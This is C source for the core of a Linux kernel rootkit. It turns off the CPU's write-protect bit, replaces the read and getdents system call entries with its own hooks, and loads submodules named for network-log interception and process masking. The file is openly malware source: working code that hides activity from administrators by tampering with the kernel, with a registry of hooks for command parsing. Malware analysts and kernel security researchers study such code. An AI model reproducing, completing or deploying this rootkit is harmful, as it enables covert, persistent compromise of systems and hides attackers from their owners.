#include <linux/module.h>		/* Needed by all kernel modules */
#include <linux/syscalls.h>		/* Needed for __NR_getdents */
#include <linux/namei.h>		/* Needed for kern_path & LOOKUP_FOLLOW */
#include <linux/ctype.h>
#include <linux/list.h>
#include <linux/slab.h>


#include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */
#include "core.h"

#include "netlog_interceptor.h"
#include "process_masker.h"

#define MOD_NAME "core"

MODULE_LICENSE("GPL");

static void disable_write_protect_mode(void);
static void enable_write_protect_mode(void);

asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count);
asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count);

struct rootkit_data *rk;

static void init_rootkit_data(struct rootkit_data **data)
{
	*data = kzalloc(sizeof(struct rootkit_data), GFP_KERNEL);

	INIT_LIST_HEAD(&(*data)->read_syscall_instrumenters);
	INIT_LIST_HEAD(&(*data)->getdents_syscall_instrumenters);
	INIT_LIST_HEAD(&(*data)->command_parsers);
}

static void load_modules(void)
{
	printk(KERN_INFO MSG_PREF(MOD_NAME)"loading modules...\n");

	/* NetLog-Interceptor */
	interceptor_init(&(rk->original_syscalls));
	process_masker_init(&(rk->original_syscalls));

	printk(KERN_INFO MSG_PREF(MOD_NAME)"module loading finished\n");
}

static int __init rootkit_start(void)
{
	rk = NULL;

	/* Initialize the rootkit structure */
	init_rootkit_data(&rk);
	disable_write_protect_mode();

	rk->syscall_table = (void *) ROOTKIT_SYS_CALL_TABLE;
	rk->original_syscalls.read_syscall = (void *) rk->syscall_table[__NR_read];
	rk->original_syscalls.getdents_syscall = (void *) rk->syscall_table[__NR_getdents];
	
	rk->syscall_table[__NR_read] = my_read_syscall;
	rk->syscall_table[__NR_getdents] = my_getdents_syscall;


	enable_write_protect_mode();
	load_modules();

	printk(KERN_INFO MSG_PREF(MOD_NAME)"Hello :)\n");

	return 0;
}

static void unload_modules(void)
{
	printk(KERN_INFO MSG_PREF(MOD_NAME)"unloading modules...\n");

	/* Interceptor-Netlogger */
	interceptor_exit();
	process_masker_exit();

	printk(KERN_INFO MSG_PREF(MOD_NAME)"module unloading finished\n");
}

static void delete_rootkit_data(struct rootkit_data *data)
{
	kfree(data);
}

static void __exit rootkit_exit(void)
{
	disable_write_protect_mode();

	/* Restore original syscalls */
	rk->syscall_table[__NR_read] = rk->original_syscalls.read_syscall;
	rk->syscall_table[__NR_getdents] = rk->original_syscalls.getdents_syscall;

	enable_write_protect_mode();

	unload_modules();
	delete_rootkit_data(rk);

	printk(KERN_INFO MSG_PREF(MOD_NAME)"successfully removed\n");

}

static void disable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Disable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 0. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 & ~0x00010000);
}

static void enable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Enable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 1. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 | 0x00010000);
}

asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count)
{
	long ret;
	struct read_syscall_instrumenter *rsi = NULL;

	/* TODO insert command parsing logic here: */

	/* Call original read_syscall */
	ret = rk->original_syscalls.read_syscall(fd, buf, count);

	/* Call all registered instrumenters */
	list_for_each_entry(rsi, &rk->read_syscall_instrumenters, list)
		ret = rsi->callback(fd, buf, count, ret);

	return ret;
}

asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	int ret;
	struct getdents_syscall_instrumenter *gsi = NULL;

	/* Call original getdents_syscall */
	ret = rk->original_syscalls.getdents_syscall(fd, dirp, count);

	/* Call all registered instrumenters */
	list_for_each_entry(gsi, &rk->getdents_syscall_instrumenters, list)
		ret = gsi->callback(fd, dirp, count, ret);

	return ret;
}

REGISTER_HOOK(register_read_instrumenter,
			  read_callback,
			  struct read_syscall_instrumenter,
			  rk->read_syscall_instrumenters);

DEREGISTER_HOOK(deregister_read_instrumenter,
				read_callback,
				struct read_syscall_instrumenter,
				rk->read_syscall_instrumenters);

REGISTER_HOOK(register_getdents_instrumenter,
			  getdents_callback,
			  struct getdents_syscall_instrumenter,
			  rk->getdents_syscall_instrumenters);

DEREGISTER_HOOK(deregister_getdents_instrumenter,
				getdents_callback,
				struct getdents_syscall_instrumenter,
				rk->getdents_syscall_instrumenters);

REGISTER_HOOK(register_command_parser,
			  command_callback,
			  struct command_parser,
			  rk->command_parsers);

DEREGISTER_HOOK(deregister_command_parser,
				command_callback,
				struct command_parser,
				rk->command_parsers);

module_init(rootkit_start);
module_exit(rootkit_exit);
